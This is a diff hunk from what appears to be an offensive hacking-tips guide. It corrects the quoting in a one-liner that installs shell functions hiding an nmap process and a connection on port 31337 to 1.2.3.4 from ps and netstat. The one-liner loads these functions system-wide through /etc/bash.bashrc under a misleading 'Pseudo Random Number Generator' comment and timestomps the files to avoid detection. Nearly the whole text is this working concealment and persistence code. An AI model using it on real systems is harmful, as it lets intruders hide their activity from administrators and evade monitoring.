@@ -211,8 +211,8 @@ Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is 
 In this example our script ```prng``` contains all of our shell functions from above. Those functions hide the `nmap` process and the network connection. Last we add `. prng` into the systemwide rc file. This will load `prng` when the user (and root) logs in:
 
 ```shell
-echo -e "netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }
-ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }" >/usr/bin/prng \
+echo -e 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }
+ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prng \
 && echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \
 && touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
 ```
